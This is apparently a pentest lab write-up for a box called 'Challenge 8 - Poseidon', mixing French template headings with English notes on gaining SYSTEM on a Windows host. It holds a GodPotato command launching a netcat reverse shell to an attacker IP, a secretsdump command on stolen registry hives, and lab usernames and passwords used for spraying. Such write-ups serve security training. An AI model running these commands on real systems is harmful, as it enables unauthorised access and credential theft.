# Challenge 8 - Poseidon

## Rapport de Pentest pour Challenge 8 - Poseidon

### Informations de base

* **Nom de la box**: Challenge 8 - Poseidon
* **Adresse IP**: 192.168.133.163
* **Date**: 3/23/2025

username: Eric.Wallows

password: EricLikesRunning800

### Phases de Pentest

#### 1. Reconnaissance

* Scan Nmap initial: `nmap -sC -sV -oA initial 192.168.133.163`
* Scan complet: `nmap -p- --min-rate 10000 -oA full 192.168.133.163`
* Vérification des versions des services découverts

<figure><img src="../../../.gitbook/assets/image (293).png" alt=""><figcaption></figcaption></figure>

#### 2. Énumération

* Énumération des utilisateurs, groupes, et autres informations pertinentes
* Recherche de vulnérabilités connues pour les services identifiés

<figure><img src="../../../.gitbook/assets/image (294).png" alt=""><figcaption></figcaption></figure>

I use exegol mode to put my variables and connect to the winrm session:

<figure><img src="../../../.gitbook/assets/image (295).png" alt=""><figcaption></figcaption></figure>

### Services Détailés

#### 3. Exploitation

* Tentatives d'exploitation des vulnérabilités découvertes
* Obtention d'un premier accès à la cible

I have some nice privileges:&#x20;

<figure><img src="../../../.gitbook/assets/image (296).png" alt=""><figcaption></figcaption></figure>

I upload tools for exploiting and get to nt auth system:

<figure><img src="../../../.gitbook/assets/image (297).png" alt=""><figcaption></figcaption></figure>

```
./god.exe -cmd "C:\Temp\nc.exe -e cmd.exe 192.168.45.210 1234"
```

<figure><img src="../../../.gitbook/assets/image (298).png" alt=""><figcaption></figcaption></figure>

I am able to copy hives and export them to my attackbox:

<figure><img src="../../../.gitbook/assets/image (299).png" alt=""><figcaption></figcaption></figure>

```
secretsdump -sam sam.hive -system system.hive -security security.save LOCAL
```

<figure><img src="../../../.gitbook/assets/image (301).png" alt=""><figcaption></figcaption></figure>

```
Impossible2Crack4.?
LisaWayToGo456
```

I spray and find access to DC02 with the user lisa

So sharphound did not work with my privesc via godpotato but worked with printspoofer



#### 4. Post-Exploitation

* Maintien de l'accès
* Élévation de privilèges
* Extraction de données sensibles

#### 5. Nettoyage

* Suppression des traces laissées sur la cible
* Documentation des vulnérabilités et méthodes d'exploitation
